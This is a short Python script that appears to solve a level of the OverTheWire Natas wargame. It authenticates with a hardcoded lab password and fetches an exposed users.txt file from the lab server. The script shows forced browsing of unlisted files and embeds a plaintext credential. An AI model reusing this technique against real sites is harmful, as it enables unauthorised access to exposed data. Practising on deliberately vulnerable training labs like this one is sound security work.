import requests
exploit=requests.session()
exploit.auth=('natas2','ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi')
request=exploit.get('http://natas2.natas.labs.overthewire.org/files/users.txt')
#password has been in the source
print(request.text)